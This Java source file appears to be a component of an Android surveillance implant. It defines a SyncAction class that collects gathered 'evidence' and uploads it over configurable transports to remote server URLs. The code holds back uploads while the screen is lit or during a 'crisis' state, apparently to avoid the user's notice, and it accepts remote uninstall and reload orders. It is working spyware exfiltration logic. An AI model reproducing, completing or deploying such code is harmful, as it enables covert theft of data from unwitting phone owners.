package com.ht.RCSAndroidGUI.action;

import java.util.Vector;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.EvidenceCollector;
import com.ht.RCSAndroidGUI.action.sync.Protocol;
import com.ht.RCSAndroidGUI.action.sync.ProtocolException;
import com.ht.RCSAndroidGUI.action.sync.Transport;
import com.ht.RCSAndroidGUI.action.sync.ZProtocol;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.agent.AgentManager;
import com.ht.RCSAndroidGUI.event.Event;
import com.ht.RCSAndroidGUI.utils.Check;

public abstract class SyncAction extends SubAction {
    protected EvidenceCollector logCollector;
    protected AgentManager agentManager;
    // protected Transport[] transports = new Transport[Transport.NUM];
    protected Vector transports;
    protected Protocol protocol;

    protected boolean initialized;

    //#ifdef DEBUG
    protected static Debug debug = new Debug("SyncAction");
    //#endif

    public SyncAction(int actionId, final byte[] confParams) {
        super(actionId, confParams);

        logCollector = EvidenceCollector.self();
        agentManager = AgentManager.self();
        transports = new Vector();

        protocol = new ZProtocol();
        initialized = parse(confParams);
        initialized &= initTransport();
    }

    public boolean execute() {
        //#ifdef DBC
        Check.requires(protocol != null, "execute: null protocol");
        Check.requires(transports != null, "execute: null transports");
        //#endif

        if (status.synced == true) {
            //#ifdef DEBUG
            debug.warn("Already synced in this action: skipping");
            //#endif
            return false;
        }

        if (status.crisisSync()) {
            //#ifdef DEBUG
            debug.warn("SyncAction - no sync, we are in crisis");
            //#endif
            return false;
        }

        //#ifndef DEBUG
        if (status.backlight()) {
            return false;
        }
        //#endif

        wantReload = false;
        wantUninstall = false;

        agentManager.reloadAgent(Agent.AGENT_DEVICE);

        boolean ret = false;

        for (int i = 0; i < transports.size(); i++) {
            Transport transport = (Transport) transports.elementAt(i);

            //#ifdef DEBUG
            debug.trace("execute transport: " + transport);
            debug.trace("transport Sync url: " + transport.getUrl());
            //#endif                       

            if (transport.isAvailable()) {
                //#ifdef DEBUG
                debug.trace("execute: transport available");
                //#endif
                protocol.init(transport);

                try {
                    ret = protocol.perform();
                    wantUninstall = protocol.uninstall;
                    wantReload = protocol.reload;
                } catch (ProtocolException e) {
                    //#ifdef DEBUG
                    debug.error(e);
                    //#endif
                    ret = false;
                } 
                //#ifdef DEBUG
                debug.trace("execute protocol: " + ret);
                //#endif

            } else {
                //#ifdef DEBUG
                debug.trace("execute: transport not available");
                //#endif
            }

            if (ret) {
                //#ifdef DEBUG
                debug.info("SyncAction OK");
                Evidence.info("Synced with url:" + transport.getUrl());
                //#endif

                status.synced = true;
                return true;
            }

            //#ifdef DEBUG
            debug.error("SyncAction Unable to perform");
            //#endif

        }

        return false;
    }

    protected abstract boolean parse(final byte[] confParams);

    protected abstract boolean initTransport();
}